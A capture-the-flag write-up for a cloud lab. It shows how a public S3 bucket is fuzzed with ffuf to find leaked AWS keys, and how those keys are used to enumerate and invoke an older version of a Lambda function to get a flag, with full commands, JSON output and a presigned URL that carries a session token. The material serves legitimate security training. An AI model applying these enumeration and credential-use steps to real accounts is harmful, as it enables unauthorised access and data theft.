# Challenge 5

---
We are back with another challenge of the week. Our Security team discovered a public S3 bucket with alleged connections with a lambda.

“Team found a S3 bucket called ‘**challenge-5**‘ publicly accessible. This bucket contains a txt file inside folder called “**secrets**“. This S3 bucket is linked with lambda in **us-east-2** region which will fetch you the flag. “

You can DM us the flag at [@securitylabs_](http://twitter.com/securitylabs_) to verify it. We might have some surprise for you!

_For more such interesting labs and content register for beta at [https://securitylabs.tech](https://securitylabs.tech/)_

Have fun hacking cloud with SecurityLabs 🙂

---

## Solution

**Getting Keys**

We are given a few pieces of information, first that a bucket exists called challenge-5, and has a folder called secrets with a .txt file in it.

Navigating to https://challenge-5.s3.amazonaws.com/secrets/
Shows we are able to access it, but downloads a blank file.

**Bruteforcing or Guessing**

Given it's an unauthenticated S3 bucket most tools used for directory brute forcing will be able to work, I just used burp intruder

You want to hit https://challenge-5.s3.amazonaws.com/secrets/ with a wordlist adding .txt extension to the word.
ie using ffuf
```
ffuf -w ourwordlist.txtt:FUZZ -u https://challenge-5.s3.amazonaws.com/secrets/FUZZ -e .txt
```

We find an file keys.txt https://challenge-5.s3.amazonaws.com/secrets/keys.txt
```
[default]
aws_access_key_id=A<redacted>GZ
aws_secret_access_key=Zdy<redacted>vrrN
```

**Setup access as usual**
```
aws sts get-caller-identity --profile cloudchall
{
    "UserId": "AIDAWDYZAHXY3FI6UENVJ",
    "Account": "420422368753",
    "Arn": "arn:aws:iam::420422368753:user/challenge-5"
}

```

I'll spare you the long and arduous details of all my attempts of enumerating various functionality.

Going back to initial challenge we have this line "This S3 bucket is linked with lambda in **us-east-2** region which will fetch you the flag."

When thinking about ways in which lambda may be integrated with s3, two come to mind.
1. We are using lambda to access the s3 bucket to perform some action, ie retrieve files for display etc.
2. We are calling lambda when some action on s3 is done.

Looking into number 2, https://docs.aws.amazon.com/AmazonS3/latest/userguide/NotificationHowTo.html we can see S3 can be set up to send event notifications to Lambda.

Looking at the s3api documentation we can see a function get-bucket-notification-configuration.

```
aws s3api get-bucket-notification-configuration --bucket challenge-5 --region us-east-2 --profile cloudchall
{
    "LambdaFunctionConfigurations": [
        {
            "Id": "Event",
            "LambdaFunctionArn": "arn:aws:lambda:us-east-2:420422368753:function:myFunction",
            "Events": [
                "s3:ObjectCreated:*"
            ],
            "Filter": {
                "Key": {
                    "FilterRules": [
                        {
                            "Name": "Prefix",
                            "Value": ""
                        },
                        {
                            "Name": "Suffix",
                            "Value": ""
                        }
                    ]
                }
            }
        }
    ]
}
```
We can now try to get-function using this function name

```
aws lambda get-function --function-name myFunction --profile cloudchall --region us-east-2
{
    "Configuration": {
        "FunctionName": "myFunction",
        "FunctionArn": "arn:aws:lambda:us-east-2:420422368753:function:myFunction",
        "Runtime": "python3.8",
        "Role": "arn:aws:iam::420422368753:role/service-role/myFunction-role-17bnxuyf",
        "Handler": "lambda_function.lambda_handler",
        "CodeSize": 251,
        "Description": "",
        "Timeout": 3,
        "MemorySize": 128,
        "LastModified": "2022-03-08T13:09:41.596+0000",
        "CodeSha256": "9Cf+Umyz13SJVyyttdBkUFC8a+GCg2mFl637/8pCrUw=",
        "Version": "$LATEST",
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "03ec3adf-f250-4013-8b38-a6d6562e0ad3",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ]
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://awslambda-us-east-2-tasks.s3.us-east-2.amazonaws.com/snapshots/420422368753/myFunction-8ce4e48e-150a-4d51-a9d3-949f0edbbd28?versionId=bBdctkmW0kytFCcnxLes9wtlOBb9XpR8&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEGYaCXVzLWVhc3QtMiJIMEYCIQDN0vz4YLxAc7KEMg2HdNvrvctkEJoZYUakg64%2FMdnZ9AIhAJC4f86R3RecyapJkg1WH5FhmVaxesNW2XnXmzRrR9btKoMECM%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMTA0MjQ2MDE3ODY1Igxdrtc9Gf3AG549I%2BAq1wP1819HFymaAyWEDsujJxOr4FCc4LNPyfXbpDyVkwsB8Rp9R%2BOgZ2bEHa9s9AtrJq5pDzN5W%2FTVel8wUXOj5GWmipT%2FCEuT6caU%2FPiQ5%2Bjz4kecdxDCipxqg%2Bu43JXF3p9QKRtTRWndYxbbArdtjfRKENNe%2Bsmc4IRBsL%2B7VcBcj3lN3jdB77%2FP4ALM1MZDrQe4yDSmlftD8Iz6JSbG4Afgk9bE1Oi7ppSW6kc27QZ%2Fxgil7CiJEZkeJkU0NOCxUHTtvUk1T4XL7hToLmwtH58MSij4jmXEXy6zq%2B1ZdanbLe0rxPPbcT3igFvk9VIxWABAQ7xjpmICWxk988TuQgczA3ab9Wnb4Je%2F6jnjr9VT%2BkzgcOCdgi7ZCSs82pCYDI45oUO%2F1hB1efY6gsc0p8Re9VAKVYy8h0EDLi9Q0oCq3VcQG1n9O8wnbqVRYTLG4ldFYFLJZqIqTBUNV54td98QptKmjpYUx80YrufOnryPo%2FGUS9pl61KIwg6BE1O03Zy2JpDYKt9erMl0L%2BJEDGopO6fxhqpiX7emdNR4I2u7efSopEFLthS4ZNvPNO8PLQxp9g1Lwog%2FtS5CEuJx7ZXUQdcSrGek7DLDHwgRLIzaKgwd%2BY9hV%2FUwvY%2BhkQY6pAHH55lrNjuysCqgRB4vtjHxKUl7gg%2FiroMgN%2BixV4qZDAlTiIFsDsasTwCzFbaOY%2BzlJxtNJuSiHoaL3I8BNNpWF7CjZmMYND5yMGpPPmi1ulB8EiTe66oUsoJzXaSgXknIJur7BUjJjXTWW4GaIJjwhn0bg%2FAEdHf%2BmOQ7OCGs%2FNDrxNTJr%2FfDXneaqiWcjEBUgHPxGWuw7Go7jINVuH1cfn4IOQ%3D%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20220309T065155Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIARQRML75E4KMZ6N4O%2F20220309%2Fus-east-2%2Fs3%2Faws4_request&X-Amz-Signature=6b304252d6ac62ee49329a638f75c4806c42e8af0c4f694788a3426a5ad604c9"
    }
}

```

Downloading the source gives us this.

```
import json

def lambda_handler(event, context):
    flag = "Try harder :)"
    return {
        'statusCode': 200,
        'body': flag
    }
```

Now if AWS based ctfs have taught us anything, it's that almost everything can have versions.
```
aws lambda list-versions-by-function --function-name myFunction --profile cloudchall --region us-east-2
{
    "Versions": [
        {
            "FunctionName": "myFunction",
            "FunctionArn": "arn:aws:lambda:us-east-2:420422368753:function:myFunction:$LATEST",
            "Runtime": "python3.8",
            "Role": "arn:aws:iam::420422368753:role/service-role/myFunction-role-17bnxuyf",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 251,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2022-03-08T13:09:41.596+0000",
            "CodeSha256": "9Cf+Umyz13SJVyyttdBkUFC8a+GCg2mFl637/8pCrUw=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "03ec3adf-f250-4013-8b38-a6d6562e0ad3",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ]
        },
        {
            "FunctionName": "myFunction",
            "FunctionArn": "arn:aws:lambda:us-east-2:420422368753:function:myFunction:1",
            "Runtime": "python3.8",
            "Role": "arn:aws:iam::420422368753:role/service-role/myFunction-role-17bnxuyf",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 263,
            "Description": "v0",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2022-03-08T12:34:28.000+0000",
            "CodeSha256": "RI+0wjUOYPJ/Gbbb9fXTQ87lpQNA5w8pUKbiHgf2No8=",
            "Version": "1",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "275acb0b-645d-4d7b-9c99-1dfbc779cd3d",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ]
        },
        {
            "FunctionName": "myFunction",
            "FunctionArn": "arn:aws:lambda:us-east-2:420422368753:function:myFunction:2",
            "Runtime": "python3.8",
            "Role": "arn:aws:iam::420422368753:role/service-role/myFunction-role-17bnxuyf",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 380,
            "Description": "v1",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2022-03-08T12:38:52.000+0000",
            "CodeSha256": "kLa4B6fTycoVXYXLe9Cx3jHqMbSQlwoq3mByim5AzaU=",
            "Version": "2",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "11ffb0aa-7dd4-45f9-af0d-024c5cc8b049",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ]
        }
    ]
}
```

Invoking the other version of the function, you could also probably just get the function source code again but figured I'd try running it instead.
```
aws lambda invoke --function-name 'arn:aws:lambda:us-east-2:420422368753:function:myFunction:2' --profile cloudchall --region us-east-2 out
{
    "StatusCode": 200,
    "ExecutedVersion": "2"
}

cat out
{"statusCode": 200, "body": "flag<redacted>\nYou can find more interesting challenges and learning materials at SecurityLabs. Register for beta at https://www.securitylabs.tech in case you haven't.\nHave fun hacking cloud with SecurityLabs\n"
```
